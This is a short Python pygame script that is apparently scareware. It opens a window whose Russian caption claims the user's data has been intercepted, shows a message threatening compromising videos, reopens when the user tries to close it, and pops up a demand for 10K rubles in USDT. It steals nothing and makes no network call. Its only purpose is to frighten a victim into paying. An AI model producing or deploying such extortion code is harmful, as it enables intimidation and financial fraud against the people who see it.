import time
import pygame
from tkinter import *
from tkinter import  messagebox

Tk().wm_withdraw()

pygame.init()

pygame.display.set_icon(pygame.image.load("icon.png"))

window = pygame.display.set_mode((850, 200))
pygame.display.set_caption('Ваши данные перехвачены, следуйте инструкции')
font = pygame.font.SysFont("Lucida  Console", 25)
text = font.render("у нас есть интересные видео с тобой ;)", 1, (51, 255, 51, 1))

while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            time.sleep((0.10))
            window = pygame.display.set_mode((850, 100))
            pygame.display.set_caption('Ваши данные перехвачены, следуйте инструкции')
            messagebox.showerror("переводи 10К рублей на USDT:", "secret")

    window.fill((0, 0, 0))
    window.blit(text, (50, 50))

    pygame.display.update()
